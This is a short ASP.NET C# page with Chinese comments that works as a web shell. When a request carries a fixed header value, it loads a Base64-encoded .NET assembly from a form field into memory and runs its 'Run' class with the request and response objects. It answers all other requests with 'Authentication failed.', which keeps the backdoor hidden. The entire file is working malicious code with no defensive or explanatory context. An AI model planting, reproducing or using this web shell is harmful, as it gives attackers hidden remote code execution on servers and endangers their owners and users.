<%@ Page Language="c#" %>
<%
    // 检查请求头中是否包含指定的认证内容
    string authenticationHeader = Request.Headers["Authentication"];
    if (authenticationHeader == "www.baidu.com")
    {
        // 获取表单数据中名为 "1" 的数据
        String Payload = Request.Form["1"];

        // 检查 Payload 是否为 null
        if (Payload != null)
        {
            // 尝试加载一个程序集，这里假设 Payload 包含一个经过Base64编码的程序集的字节数组
            System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));

            // 创建程序集中的一个名为 "Run" 的类的实例，并调用它的方法
            assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { Request, Response });
        }
    }
    else
    {
        // 认证失败时的处理
        Response.StatusCode = 403; // Forbidden
        Response.Write("Authentication failed.");
        Response.End();
    }
%>
